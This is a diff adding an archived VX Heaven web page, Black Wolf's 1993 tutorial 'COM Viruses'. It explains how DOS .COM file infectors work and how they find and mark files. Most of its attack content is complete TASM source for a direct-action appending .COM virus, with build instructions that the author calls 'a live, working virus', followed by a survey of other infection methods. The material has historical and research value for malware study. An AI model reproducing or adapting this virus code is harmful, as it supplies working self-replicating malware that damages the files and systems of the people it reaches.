@@ -1,0 +1,247 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Black Wolf 'COM Viruses' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Black Wolf"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Black Wolf,COM Viruses, offset, command, call, jump, bytes, method, type, memory, files, infected, file, jumps, directly, host, code"/>
+<meta name="Description" content="[...] There are numerous methods to infect each file type - some of the more popular will be shown in this tutorial. The simplest type of executable file to infect is the .COM file. [...]"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"fb069cbd665879f05a369533018a2e5e16b16911-1498755757-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vbw02.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>COM Viruses</h1><p><a href="/lib/?lang=en&amp;author=Black%20Wolf"> Black Wolf</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vbw02.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vbw02">Back to index</a>] [<a href="/lib/vbw02.html#disqus_thread">Comments</a>]<br/> 
+<p>Most viruses, unlike those presented in the Batch viruses and Upper-Level language viruses sections, only infect executable files such as .COM's and .EXE's and are written in assembly. There are numerous methods to infect each file type - some of the more popular will be shown in this tutorial. The simplest type of executable file to infect is the .COM file. COM files are direct memory images of the programs. When a COM file is run, DOS loads what is called the Program Segment Prefix (PSP), a data structure containing a lot of "book keeping" information for DOS, at the first available segment in memory. The PSP is 256 (100h) bytes long. Directly after this, the .COM file is loaded into memory, so it starts at an offset of 100h. Because COM files are loaded directly into memory as images, they must be able to be contained, with the PSP, in one segment, making their maximum length just short of 64K.</p>
+<p>Because COM's are so simple, there are a multitude of ways to infect them. One way is, as seen in the C virus earlier, just to overwrite them with the viral code. This is obviously not the prefered method, however, as it destroys the host program. Instead, a way must be found to allow the virus to execute, then to restore control to the host program afterwards. Several methods to do this have been developed, the most common of which is the appending virus. The basic technique to this style of virus is to place its code at the end of the file, then place a jump at the beginning of the file to point to the end. This accomplishes the task of executing the virus first thing when the file is run. To restore control to the host, however, takes a few tricks. First, one must store the bytes that the jump was written over in the file. Then, once the virus is finished, these bytes must be restored in memory, and the virus should jump to the beginning of the host (at 100h because it is a .COM). This is all simple enough, but there is one more difficulty that this type of virus must face. With 8086 assembly, all of the near jumps and calls are relative - that is, a command that jumps ten bytes forward when executed in one location will jump ten bytes forward when executed in another. Data referencing, however, is done on an absolute basis. If a file has data at one place in memory when compiled, then even if it is offset in memory it will continue to look for the data at the original location. Because viruses that work in the manner described earlier could possibly end up at any offset from their original positions, we must find a way to adjust for that. There are several tricks for this, the most common being to CALL a dummy subroutine, POP the current offset of the next command off of the stack, subtract the old offset of the command DIRECTLY AFTER the call, and store the result in BP (or BX, SI, DI, etc.) for indirect addressing, i.e. "mov ax,[bp+Location]." The reason this works is because the CALL command does two things, it pushes the offset of the command directly after it onto the stack, and then it jumps to the location of the subroutine. Since the ORIGINAL offset of the command directly after the call is then subtracted from the CURRENT offset of the command, it gives you the total displacement of the virus. A simple coding example for the is the following:</p>
+<pre class="source">
+	call get_offset			;Call dummy subroutine
+get_offset:
+	pop bp				;Pop current offset of get_offset
+					;into BP
+	sub bp,offset get_offset 	;Subtract original offset to get
+					;current displacement of virus.
+	lea si,[bp+wherever]		;Common way to set a register to
+					;be the the offset of a variable.
+</pre>
+<p>Now that we have a basic feeling of what a .COM infector must do, let's list each step needed in a relatively simple appending COM virus.</p>
+<ol>
+<li>Jump to virus</li>
+<li>Find a .COM file. If none are left, go to step 6.</li>
+<li>Check to see if it has been infected. If it has, go to step 2.</li>
+<li>Write the virus to the end of the file.</li>
+<li>Store the first three or four bytes at the beginning of the new host and overwrite them with a jump to the virus code.</li>
+<li>Restore host's old bytes and return control to host.</li>
+</ol>
+<p>Looking at step #3, we see something that was breezed over in the second C virus - identification of infected files. Usually, this is done by "marking" each file infected in some way, either through the time-stamp or by placing a specific "marker byte" in the file that the virus can check for. If this is not done, than files may be infected repeatedly until they grow too large to execute - not a desirable result. The following virus is a simple direct action (meaning it infects files when it is run and does not stay present in memory afterwards) appending .COM infector. It will infect one uninfected .COM file in the current directory each time it is executed until all are infected. Notice that the programs will execute just as if they were uninfected, with perhaps a slight delay before they run and a little extra disk access. Study the following code carefully, as it contains some neccessary portions of code that have NOT been mentioned so far - they will be explained in the code.</p>
+<pre class="source">
+; This file is a direct-action appending .COM infector
+;written in TASM - compatible assembler for the IBM PC.
+;It is presented as a part of VIROLOGY 101 (c) 1993 Black Wolf.
+;It is a live virus, and should NOT be released. Please execute
+;the virus only on isolated machines under controlled conditions.
+; To compile this virus, one must first make a stub file, or
+;an initial "host", and attach the virus to it. The stub should be
+;a program like the following:
+;
+; .model tiny
+; .code
+; org 100
+;start:
+; nop
+; nop
+; nop
+; nop
+;end start
+;
+; To attach the stub file to the virus, use the following line
+;from DOS.
+; copy /b stub.com+vircode.com newvirus.com
+;
+;This will produce a live, working virus. Please be careful with
+;it.
+
+
+.model tiny
+.radix 16			;Default into Hexidecimal
+.code
+org 100
+start:
+call get_offset			;This places the displace-
+				;ment of the virus from its
+get_offset:			;original compilation into
+pop bp 				;BP.
+sub bp,offset get_offset
+
+Restore_Host_File:		;This routine moves the
+lea si,[storage_bytes+bp]	;stored bytes of the
+mov di,100			;current host back to their
+movsw				;original place (at the
+movsw				;beginning of the host).
+
+;The DTA (Data Transfer Address) is the location that DOS puts
+;information regarding file I/O, such as from a search for files,
+;CS:0080 in .COM files - inside the PSP. Unfortunately, it is
+;located at the same address in the PSP as the command-line
+;parameters that are passed from DOS to your user program.
+;Because of this, if you simply asked Dos to do a search for files
+;without changing the location of the DTA first, all command-line
+;information would be lost. This would be disasterous in viruses,
+;as it would cause unpredictable results in the host file. The
+;solution is simple: move the DTA to a new address for the virus,
+;then restore it to the default position before the virus restores
+;control to the host.
+
+Set_DTA:
+lea dx,[end_virus+bp]		;Set DTA to the end of the
+mov ah,1a ;virus.
+int 21
+
+mov ah,4e
+xor cx,cx			;Look only for normal
+				;attributes.
+lea dx,[File_Mask+bp]		;Search for all files
+Find_File:			;matching '*.COM'.
+int 21
+jc No_More_Files
+
+mov ax,3d02
+lea dx,[end_virus+1e+bp]	;Offset 1eh in DTA =
+				; filename
+int 21				;Open file for read/write
+				;access.
+
+xchg bx,ax			;Put File handle into BX
+
+mov ah,3f
+mov cx,4
+lea dx,[storage_bytes+bp]	;Read in first four bytes
+int 21				;of file
+
+cmp word ptr [storage_bytes+bp],'ZM' ;Standard EXE
+je close_file			;mark, file is a
+				;misnamed EXE.
+
+cmp word ptr [storage_bytes+bp],'MZ' ;Other possible
+je close_file			;EXE mark.
+
+cmp byte ptr [storage_bytes+bp+3],'V' ;Infection mark:
+je close_file			;file infected.
+
+mov ax,4202			;Go to the end of the file.
+xor cx,cx			;This function returns
+xor dx,dx			;file size into
+int 21				;DX:AX
+
+sub ax,3			;Put file size - 3
+mov word ptr [bp+jump_bytes+1],ax ;(jump instruction
+				;length) into jump
+				;bytes.
+
+mov ah,40			;Write virus to the
+mov cx,end_virus-start		;end of the file.
+lea dx,[bp+start]
+int 21
+
+mov ax,4200			;Return to the
+xor cx,cx			;beginning of the
+xor dx,dx			; file.
+int 21
+
+mov ah,40			;Write jump bytes
+mov cx,4			;and marker byte
+lea dx,[bp+jump_bytes]		;to the beginning
+int 21				;of file.
+
+mov ah,3e			;Close file
+int 21
+jmp No_More_Files		;Only infect one
+				;file each time.
+
+Close_File:			;Close current file
+mov ah,3e
+int 21
+
+Find_Next_File:			;Find another file
+mov ah,4f
+jmp Find_File
+
+No_More_Files:			;Reset DTA to original location
+mov dx,80
+mov ah,1a
+int 21
+
+Restore_To_Host:		;This is basically a "jmp cs:100"
+mov di,100
+push di
+ret
+
+
+File_Mask db '*.COM',0		;File mask used for search
+jump_bytes db 0e9,0,0,'V'	;'V' is the marker byte.
+storage_bytes:
+nop				;dummy storage bytes for
+nop				;first execution.
+int 20				;Terminate
+
+end_virus:
+end start
+</pre>
+<p>While the appending COM infector may be the most common, it by far not the only method of infecting a COM file. Some of the different ways are briefly explained below.</p>
+<p>Generic Appending: This is the method explained and demonstrated earlier. It will place a jump over the first few bytes of the host that jumps to the end of the host, where it places itself.</p>
+<p>"Shift" virus: These viruses place themselves at the beginning of the file, "shifting" the host to a new offset in memory. When they are done executing, they "shift" the host back to offset 100h and execute it. This style eliminates the need for the displacement calculations found in appending viruses, but they must find some way to "shift" the host back without overwriting the code doing the "shifting". This technique works best in memory resident viruses, rather than direct action.</p>
+<p>Non-Destructive Overwriting: The usual method for this type is to copy a chunk of code at the beginning of the host to the end of the file, then overwrite that chunk with the virus. Restoration is quite similair to the "Shift" method. As above, this one works best as a memory resident virus.</p>
+<p>Jump Redirection: This type is basically the same as the Appending style, but it will redirect jumps that are already inside the host to point to it.</p>
+<p>Random Placement: This type is rare, generally found as research viruses only. It can place itself anywhere within a file, usually using methods similar to the Non-Destructive Overwriting for restoration and either Jump Redirection of the Generic Appending for execution (i.e. jumps to virus). The main purpose for this is to complicate disinfection - a little.</p>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vbw02">Back to index</a>] [<a href="/lib/vbw02.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vbw02">de</a><a href="/lib/index.php?lang=en&amp;id=vbw02">en</a><a href="/lib/index.php?lang=es&amp;id=vbw02">es</a><a href="/lib/index.php?lang=it&amp;id=vbw02">it</a><a href="/lib/index.php?lang=fr&amp;id=vbw02">fr</a><a href="/lib/index.php?lang=pl&amp;id=vbw02">pl</a><a href="/lib/index.php?lang=ru&amp;id=vbw02">ru</a><a href="/lib/index.php?lang=ua&amp;id=vbw02">ua</a></div>
+</body>
+</html>
